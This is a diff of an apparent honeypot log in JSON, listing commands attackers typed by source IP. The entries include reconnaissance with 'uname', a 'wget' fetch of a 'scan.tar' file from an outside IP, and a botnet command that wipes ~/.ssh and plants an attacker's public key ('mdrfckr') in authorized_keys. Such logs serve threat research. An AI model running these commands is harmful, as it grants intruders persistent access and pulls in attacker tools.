@@ -617,6 +617,42 @@
             "session": "45e3eda88fbd"
         },
         {
+            "timestamp": "2023-11-13T07:11:33.018043Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "d648139a68f4"
+        },
+        {
+            "timestamp": "2023-11-13T07:17:34.714111Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "c67858672b60"
+        },
+        {
+            "timestamp": "2023-11-13T07:23:37.531082Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "0d5be727f682"
+        },
+        {
+            "timestamp": "2023-11-13T07:29:40.820065Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "9b1591d4bc3b"
+        },
+        {
+            "timestamp": "2023-11-13T07:41:45.888114Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "2e5d11612a74"
+        },
+        {
+            "timestamp": "2023-11-13T07:47:45.428227Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "e2a81ef3519e"
+        },
+        {
             "timestamp": "2023-11-09T22:10:37.262975Z",
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
@@ -765,6 +801,18 @@
             "session": "b06c47c7a9c1"
         },
         {
+            "timestamp": "2023-11-13T07:10:07.615962Z",
+            "event": "command_input",
+            "input": "wget 58.216.207.82/scan.tar",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:10:20.944389Z",
+            "event": "command_input",
+            "input": "exit",
+            "session": "b06c47c7a9c1"
+        },
+        {
             "timestamp": "2023-11-12T23:13:30.806031Z",
             "event": "command_input",
             "input": "grep -c ^processor /proc/cpuinfo",
@@ -775,6 +823,44 @@
             "event": "command_input",
             "input": "grep -c ^processor /proc/cpuinfo",
             "session": "ab532e8b290d"
+        }
+    ],
+    "115.245.120.238": [
+        {
+            "timestamp": "2023-11-13T07:44:53.273527Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "a88f7a78fefb"
+        },
+        {
+            "timestamp": "2023-11-13T07:44:54.269724Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "a88f7a78fefb"
+        },
+        {
+            "timestamp": "2023-11-13T07:44:54.567393Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "a88f7a78fefb"
+        },
+        {
+            "timestamp": "2023-11-04T14:48:44.783147Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "cee2b7798501"
+        },
+        {
+            "timestamp": "2023-11-04T14:48:45.661713Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "cee2b7798501"
+        },
+        {
+            "timestamp": "2023-11-04T14:48:45.948519Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "cee2b7798501"
         }
     ],
     "189.112.0.11": [
@@ -6869,26 +6955,6 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "e9d3dd8aec34"
-        }
-    ],
-    "115.245.120.238": [
-        {
-            "timestamp": "2023-11-04T14:48:44.783147Z",
-            "event": "command_input",
-            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-            "session": "cee2b7798501"
-        },
-        {
-            "timestamp": "2023-11-04T14:48:45.661713Z",
-            "event": "command_input",
-            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-            "session": "cee2b7798501"
-        },
-        {
-            "timestamp": "2023-11-04T14:48:45.948519Z",
-            "event": "file_download",
-            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
-            "session": "cee2b7798501"
         }
     ],
     "172.245.185.6": [
